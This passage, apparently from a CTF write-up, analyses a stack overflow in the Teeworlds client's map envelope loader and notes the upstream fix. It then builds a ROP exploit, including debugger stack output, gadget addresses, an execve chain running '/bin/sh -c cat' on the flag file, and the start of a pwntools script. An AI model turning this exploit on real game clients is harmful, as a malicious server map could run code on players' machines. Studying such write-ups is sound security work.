+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; CMapLayers&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;LoadEnvPoints(&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; CLayers &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;pLayers, array&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;CEnvPoint&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;amp;&lt;/span&gt; lEnvPoints)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	lEnvPoints.clear();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// get envelope points
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	CEnvPoint &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;pPoints &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; Start, Num;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		pLayers&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;Map()&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;GetType(MAPITEMTYPE_ENVPOINTS, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;Start, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;Num);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;Num)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		pPoints &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (CEnvPoint &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)pLayers&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;Map()&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;GetItem(Start, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As next step, it requests the number of envelopes from the index.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// get envelopes
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; Start, Num;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	pLayers&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;Map()&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;GetType(MAPITEMTYPE_ENVELOPE, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;Start, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;Num);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;Num)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After this preparations the interesting part of the function starts. The function will loop over all envelopes and parses them.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; env &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; env &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; Num; env&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		CMapItemEnvelope &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;pItem &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (CMapItemEnvelope &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)pLayers&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;Map()&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;GetItem(Start&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;env, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If the envelope has version 3 or above, it&amp;rsquo;s points are already saved in version 2 and can be read directly from file.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(pItem&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;m_Version &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; pItem&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;m_NumPoints; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				lEnvPoints.add(pPoints[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pItem&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;m_StartPoint]);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Envelopes with lower versions will use the old point format, lacking the tangent arrays. To have all points in the new format, they are converted to the new format. Due to the nature of the pointer arithmetic in C and C++ and the used parsing of the entire file region as points of the old version, all points have to have the same version or the points of the old format have to come first, leaving a hole between the different versions or requiring overlapping indices.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;// backwards compatibility
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; pItem&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;m_NumPoints; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#75715e&#34;&gt;// convert CEnvPoint_v1 -&amp;gt; CEnvPoint
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;				CEnvPoint_v1 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;pEnvPoint_v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;((CEnvPoint_v1 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)pPoints)[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pItem&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;m_StartPoint];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				CEnvPoint p;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				p.m_Time &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pEnvPoint_v1&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;m_Time;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				p.m_Curvetype &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pEnvPoint_v1&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;m_Curvetype;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Maybe in an attempt to speed up the conversion, only used channels are copied over to the sturct of the new version. Since the server controls the number of channels and they are parsed as 32-bit signed integer, the server can specify a much larger numbers of channels. Since C-arrays have no bounds checks, the data will be written as the array is large enough to hold them. Since the tangents follow the copied values, they will be overwritten by the excess values. As a consequence, this allows the server to overflow the stack. The length of the overflow can be chosen by the number of channels. After the copied memory content, the tangent arrays will always write 64 null bytes.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; c &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; pItem&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;m_Channels; c&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					p.m_aValues[c] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pEnvPoint_v1&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;m_aValues[c];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					p.m_aInTangentdx[c] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					p.m_aInTangentdy[c] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					p.m_aOutTangentdx[c] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;					p.m_aOutTangentdy[c] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				lEnvPoints.add(p);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The merged pull request fixes this by capping the number of channels at 4 with the help of the &lt;code&gt;minimum&lt;/code&gt; function.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; c &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; minimum(pItem&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;m_Channels, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;); c&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;setup&#34;&gt;Setup&lt;/h2&gt;
+&lt;p&gt;Before we can start examining the context of the overflow and exploiting the service, we have to get a working server distributing our carefully crafted exploit map. The&lt;/p&gt;
+&lt;h2 id=&#34;stack&#34;&gt;Stack&lt;/h2&gt;
+&lt;p&gt;Since we now know, how to trigger the overflow and which content will be written, we can examine the overflow in the Teeworlds client used in this challenge. For an easier file exploit file, we will reduce the number of points in envelope 1 to 1, such that the overflow will be triggered only once. By replacing the first two values with 0x41414141 (&amp;ldquo;AAAA&amp;rdquo;) and after copying both values over to the stack, our payload is written to 0x7ffffffddc78 and the next return address can be found at 0x7ffffffddd08. As a result of this, 0x90 bytes of padding are needed in front of the ROP chain. Since the overflow is measured in units of 4 bytes, this corresponds to a padding of 34 channels. As already known from the Dockerfile, no canary is present.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;pwndbg&amp;gt; stack 50
+00:0000│ rsp 0x7ffffffddc30 ◂— 0x0
+01:0008│     0x7ffffffddc38 —▸ 0xa496b0 ◂— 0x100000000
+02:0010│     0x7ffffffddc40 —▸ 0x7ffffffddc70 ◂— 0x1
+03:0018│     0x7ffffffddc48 ◂— 0x100000000
+04:0020│     0x7ffffffddc50 ◂— 0x0
+05:0028│     0x7ffffffddc58 —▸ 0x77d180 ◂— 0xc00000005
+06:0030│     0x7ffffffddc60 ◂— 0x0
+07:0038│     0x7ffffffddc68 ◂— 0x600000006
+08:0040│     0x7ffffffddc70 ◂— 0x1
+09:0048│ rax 0x7ffffffddc78 ◂— &amp;#39;AAAAAAAA&amp;#39;
+0a:0050│     0x7ffffffddc80 ◂— 0x0
+... ↓        5 skipped
+10:0080│     0x7ffffffddcb0 —▸ 0x74cd58 —▸ 0x70616d ◂— 0x0
+11:0088│     0x7ffffffddcb8 ◂— 0x0
+12:0090│     0x7ffffffddcc0 —▸ 0x74cd58 —▸ 0x70616d ◂— 0x0
+13:0098│     0x7ffffffddcc8 —▸ 0x521915 ◂— 0x657661530070616d /* &amp;#39;map&amp;#39; */
+14:00a0│     0x7ffffffddcd0 ◂— 0x10
+15:00a8│     0x7ffffffddcd8 —▸ 0x55bf40 (gs_MapLayersBackGround) —▸ 0x54cef8 —▸ 0x46b8d0 (CMapLayers::~CMapLayers()) ◂— endbr64
+16:00b0│     0x7ffffffddce0 —▸ 0x77c8d0 —▸ 0x54d820 —▸ 0x4b5f20 (CGameClient::~CGameClient()) ◂— endbr64
+17:00b8│     0x7ffffffddce8 —▸ 0x77d180 ◂— 0xc00000005
+18:00c0│     0x7ffffffddcf0 —▸ 0x7ffff6bfa010 —▸ 0x54bfc0 —▸ 0x43db00 (CClient::~CClient()) ◂— endbr64
+19:00c8│     0x7ffffffddcf8 —▸ 0x7ffffffddd80 —▸ 0x7ffff6c06a82 ◂— 0x375a5dfe52ada70b
+1a:00d0│     0x7ffffffddd00 ◂— 0x1
+1b:00d8│     0x7ffffffddd08 —▸ 0x46b752 (CMapLayers::OnMapLoad()+34) ◂— mov    rdi, qword ptr [rbx + 8]
+1c:00e0│     0x7ffffffddd10 —▸ 0x7ffff6bfa010 —▸ 0x54bfc0 —▸ 0x43db00 (CClient::~CClient()) ◂— endbr64
+1d:00e8│     0x7ffffffddd18 ◂— 0xb /* &amp;#39;\x0b&amp;#39; */
+1e:00f0│     0x7ffffffddd20 —▸ 0x77d180 ◂— 0xc00000005
+1f:00f8│     0x7ffffffddd28 —▸ 0x4b5e0b (CGameClient::OnConnected()+75) ◂— mov    rdi, qword ptr [rbp + rbx*8 + 0x10]
+20:0100│     0x7ffffffddd30 —▸ 0x7fffffffdee0 ◂— 0x100000000
+21:0108│     0x7ffffffddd38 —▸ 0x7ffff6bfa010 —▸ 0x54bfc0 —▸ 0x43db00 (CClient::~CClient()) ◂— endbr64
+22:0110│     0x7ffffffddd40 ◂— 0x0
+23:0118│     0x7ffffffddd48 —▸ 0x43ba7a (CClient::ProcessServerPacket(CNetChunk*)+1482) ◂— jmp    0x43b5c8
+24:0120│     0x7ffffffddd50 ◂— 0x568
+25:0128│     0x7ffffffddd58 ◂— 0x0
+... ↓        4 skipped
+2a:0150│     0x7ffffffddd80 —▸ 0x7ffff6c06a82 ◂— 0x375a5dfe52ada70b
+2b:0158│     0x7ffffffddd88 —▸ 0x7ffff6c06a83 ◂— 0x5375a5dfe52ada7
+2c:0160│     0x7ffffffddd90 —▸ 0x7ffff6c06a83 ◂— 0x5375a5dfe52ada7
+2d:0168│     0x7ffffffddd98 ◂— 0x0
+... ↓        4 skipped
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;exploit&#34;&gt;Exploit&lt;/h1&gt;
+&lt;p&gt;With this information we cant start developing the exploit. Since the flag is stored in a file and the Rust script forwards the stdout of the client to us, a simple ROP chain leaking it&amp;rsquo;s content is sufficient to solve this challenge. So let&amp;rsquo;s have a look at the available gadgets by using &lt;code&gt;ROPgadget --binary teeworlds&lt;/code&gt;. Under the 49198 gadgets found by ROPgadget are a huge amount of basic instructions with a variaty of registers, including gadgets for a syscall with three arguments.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;0x000000000045f135 : mov qword ptr [rdi], rax ; ret
+0x000000000043faf0 : pop rax ; ret
+0x00000000004326e3 : pop rdi ; ret
+0x00000000004bc1d4 : pop rdx ; ret
+0x0000000000437fcb : pop rsi ; ret
+0x0000000000465f30 : syscall
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Since most of the &lt;code&gt;syscall&lt;/code&gt; gadgets are followed by bad instructions or dereferenciations of rax, most syscalls will be followed by a crash. A solution to this problem is the &lt;code&gt;execve&lt;/code&gt; syscall, since it replaces the entire process with the new one. &lt;code&gt;execve&lt;/code&gt; needs three arguments: the path of the new executable, its arguments and its environment. While the first argument is mandatory, the following ones can also be null. Since we want to log the content of a file, &lt;code&gt;cat&lt;/code&gt; is a viable target. Since &lt;code&gt;cat&lt;/code&gt; expects the file to print as it&amp;rsquo;s argument, we also need to build argv. Because the service is compiled without PIE, we not only know the address of the gadgets but also the address of the writable bss segment containing uninitialized global variables. This allows us to use one of the move instructions, such as &lt;code&gt;mov qword ptr [rdi], rax; ret&lt;/code&gt;, to prepare the argument array by first popping the memory content and it&amp;rsquo;s address and then moving it to the previously popped address.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;pop rax; ret
+$content
+pop rdi; ret
+$address
+mov qword ptr [rdi], rax; ret
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Since &lt;code&gt;cat&lt;/code&gt; may be in different places on our system and the one used by the service and we wanted the exploit to also work on our system for testing purposes, we decided to use &lt;code&gt;sh&lt;/code&gt; for resolving &lt;code&gt;cat&lt;/code&gt;. The full argv will therefore be &lt;code&gt;[&amp;quot;/bin/sh&amp;quot;, &amp;quot;-c&amp;quot;, &amp;quot;cat /home/rwctf/flag&amp;quot;]&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Now we can start developing the exploit.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;elf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;binary &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./teeworlds&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rop &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ROP(elf)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rop_chain &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Let&amp;rsquo;s begin with writing &lt;code&gt;argv&lt;/code&gt; into the bss section. Since strings in C are null-terminated, we can use null bytes to easily seperate the arguments.&lt;/p&gt;
